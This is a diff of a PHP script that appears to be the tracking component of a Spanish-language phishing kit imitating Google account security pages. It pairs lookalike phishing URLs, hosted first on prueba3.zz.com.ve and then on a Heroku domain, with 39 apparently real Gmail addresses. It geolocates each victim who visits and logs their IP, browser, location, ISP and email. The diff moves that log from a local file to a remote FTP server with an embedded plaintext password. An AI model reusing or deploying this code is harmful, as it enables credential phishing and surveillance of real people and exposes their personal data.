@@ -1,11 +1,92 @@
 <?php
 $vinculo = $_SERVER['HTTP_REFERER'];
 
-$url = array("http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?01","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?02","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?03","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?04","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?05","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?06","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?07","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?08","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?09","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?10","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?11","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?12","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?13","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?14","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?15","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?16","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?17","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?18","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?19","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?20","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?21","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?22","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?23","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?24","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?25","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?26","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?27","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?28","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?29","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?30","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?31","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?32","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?33","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?34","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?35","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?36","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?37","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?38","http://prueba3.zz.com.ve/Sifotinoptionspark/1/passwordutm01_source=google-account&utm_medium=web&continue=https-myaccount.google.com-security/?39");
+
+$url = array(
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?00",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?01",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?02",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?03",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?04",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?05",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?06",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?07",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?08",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?09",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?10",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?11",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?12",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?13",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?14",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?15",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?16",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?17",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?18",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?19",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?20",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?21",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?22",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?23",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?24",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?25",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?26",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?27",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?28",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?29",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?30",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?31",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?32",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?33",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?34",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?35",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?36",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?37",
+"https://accountgoogle.herokuapp.com/SigninsettingsPast/1/passwordutm01_source=go-account&utm_medium=web&continue=https-myaccount.go.com-security/?38"
+);
 
 
-$correo = array("rojo.alac@gmail.com","elvisrodriguezs94@gmail.com","castilloanya@gmail.com","soral.92v@gmail.com","elevangelistadecristo1998@gmail.com","rodriguezma45@gmail.com","plinio9410@gmail.com","ganadesdelaweb@gmail.com","eltabogarcia@gmail.com","alvarezcristhofher4@gmail.com","laar1984@gmail.com","HIPICAPASION@GMAIL.COM","briianjj2016@gmail.com","consultorsha@gmail.com","yelitzondavid.ft@gmail.com","osothor66@gmail.com","alexander1x33@gmail.com","jackzius@gmail.com","tdarquitec@gmail.com","yorlis.tovar@gmail.com","verdugo838@gmail.com","agcoinss@gmail.com","aleelpran2011@gmail.com","mariaenriquetaalvarez1@gmail.com","rojascastro.ma@gmail.com","leopoldomagallanes@gmail.com","marcomirque@gmail.com","RUALCA04@GMAIL.COM","gilberlys1996@gmail.com","sergioivacevedo@gmail.com","acsuayo@gmail.com","ganadineroenrublos2018@gmail.com","jesus.erazo.mj@gmail.com","yaliana.tv@gmail.com","df.beats.25@gmail.com","diazmarwin@gmail.com","mejiasleonet@gmail.com","rafaelq.sistemas@gmail.com","jo.25el.26@gmail.com");
 
+$correo = array(
+"rojo.alac@gmail.com",
+"elvisrodriguezs94@gmail.com",
+"castilloanya@gmail.com",
+"soral.92v@gmail.com",
+"elevangelistadecristo1998@gmail.com",
+"rodriguezma45@gmail.com",
+"plinio9410@gmail.com",
+"ganadesdelaweb@gmail.com",
+"eltabogarcia@gmail.com",
+"alvarezcristhofher4@gmail.com",
+"laar1984@gmail.com",
+"HIPICAPASION@GMAIL.COM",
+"briianjj2016@gmail.com",
+"consultorsha@gmail.com",
+"yelitzondavid.ft@gmail.com",
+"osothor66@gmail.com",
+"alexander1x33@gmail.com",
+"jackzius@gmail.com",
+"tdarquitec@gmail.com",
+"yorlis.tovar@gmail.com",
+"verdugo838@gmail.com",
+"agcoinss@gmail.com",
+"aleelpran2011@gmail.com",
+"mariaenriquetaalvarez1@gmail.com",
+"rojascastro.ma@gmail.com",
+"leopoldomagallanes@gmail.com",
+"marcomirque@gmail.com",
+"RUALCA04@GMAIL.COM",
+"gilberlys1996@gmail.com",
+"sergioivacevedo@gmail.com",
+"acsuayo@gmail.com",
+"ganadineroenrublos2018@gmail.com",
+"jesus.erazo.mj@gmail.com",
+"yaliana.tv@gmail.com",
+"df.beats.25@gmail.com",
+"diazmarwin@gmail.com",
+"mejiasleonet@gmail.com",
+"rafaelq.sistemas@gmail.com",
+"jo.25el.26@gmail.com"
+);
 
 $vinculo = str_replace($url[0], $correo[0], $vinculo);
 $vinculo = str_replace($url[1], $correo[1], $vinculo);
@@ -47,26 +128,27 @@ $vinculo = str_replace($url[36], $correo[36], $vinculo);
 $vinculo = str_replace($url[37], $correo[37], $vinculo);
 $vinculo = str_replace($url[38], $correo[38], $vinculo);
 
-
-@ $details = json_decode(file_get_contents("http://ipinfo.io/{$_SERVER['REMOTE_ADDR']}/json"));
-@ $hostname=gethostbyaddr($_SERVER['REMOTE_ADDR']);
+date_default_timezone_set('America/Caracas');
+@ $details = json_decode(file_get_contents("http://ipinfo.io/{$_SERVER['HTTP_X_FORWARDED_FOR']}/json"));
+@ $hostname=gethostbyaddr($_SERVER['HTTP_X_FORWARDED_FOR']);
 @ $fileHandle = fopen($outputWebBug, "a");
 $QUERY_STRING = preg_replace("%[^/a-zA-Z0-9@,_=]%", '', $_SERVER['QUERY_STRING']);
-$ip = $_SERVER['REMOTE_ADDR'];
-$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
+$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+$hostname = gethostbyaddr($_SERVER['HTTP_X_FORWARDED_FOR']);
 $navegador = $_SERVER['HTTP_USER_AGENT'];
-$f = fopen("../results/users2.html", "a");
-fwrite ($f, '<!DOCTYPE html><meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1"><html><head><title>Capturado</title></head><code><body><b><br>');
-fwrite ($f, '<font color="#A4A4A4">Direccion IP </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FF0000">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$ip.'</font><br>');
-fwrite ($f, '<font color="#A4A4A4">Nombre del Host </font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FF0000">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$hostname.'</font><br>');
-fwrite ($f, '<font color="#A4A4A4">Navegador y O.S </font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FF0000">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$navegador.'</font><br>');
-fwrite ($f, '<font color="#A4A4A4">Coordenadas </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FF0000">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->loc.'</font><br>');
-fwrite ($f, '<font color="#A4A4A4">PSI </font>&nbsp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FF0000">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->org.'</font><br>');
-fwrite ($f, '<font color="#A4A4A4">Ciudad </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FF0000">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->city.'</font><br>');
-fwrite ($f, '<font color="#A4A4A4">Estado </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FF0000">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->region.'</font><br>');
-fwrite ($f, '<font color="#A4A4A4">Pais </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FF0000">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->country.'</font><br>');
-fwrite ($f, '<font color="#A4A4A4">Fecha </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FF0000">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.date("D dS M,Y h:i a").'</font><br>');
-fwrite ($f, '<font color="#A4A4A4">Correo </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FF0000">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#39ba48">'.$vinculo.'</font><br><font color="#A4A4A4"><br><br><font color="#FF0000">******************************************************************************************************************</font><br><br></b>');
+$time = time();
+$f = fopen("ftp://openresults:qwertyuiop@files.000webhost.com/public_html/1/users.html", "a");
+fwrite ($f, '<font color="#A4A4A4">Direccion IP </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$ip.'</font><br>');
+fwrite ($f, '<font color="#A4A4A4">Nombre del Host </font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$hostname.'</font><br>');
+fwrite ($f, '<font color="#A4A4A4">Navegador y O.S </font>&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$navegador.'</font><br>');
+fwrite ($f, '<font color="#A4A4A4">Coordenadas </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->loc.'</font><br>');
+fwrite ($f, '<font color="#A4A4A4">PSI </font>&nbsp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->org.'</font><br>');
+fwrite ($f, '<font color="#A4A4A4">Ciudad </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->city.'</font><br>');
+fwrite ($f, '<font color="#A4A4A4">Estado </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->region.'</font><br>');
+fwrite ($f, '<font color="#A4A4A4">Pais </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.$details->country.'</font><br>');
+fwrite ($f, '<font color="#A4A4A4">Fecha </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="tomato">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#2E9AFE">'.date("D dS M, Y h:i a").'</font><br>');
+fwrite ($f, '<font color="#A4A4A4">Correo </font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#FF0000">=</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color="#39ba48">'.$vinculo.'</font><br>');
+fwrite ($f, '<font color="#A4A4A4"><br><br><hr><br><br>');
 fclose($f);
 exit;
 ?>
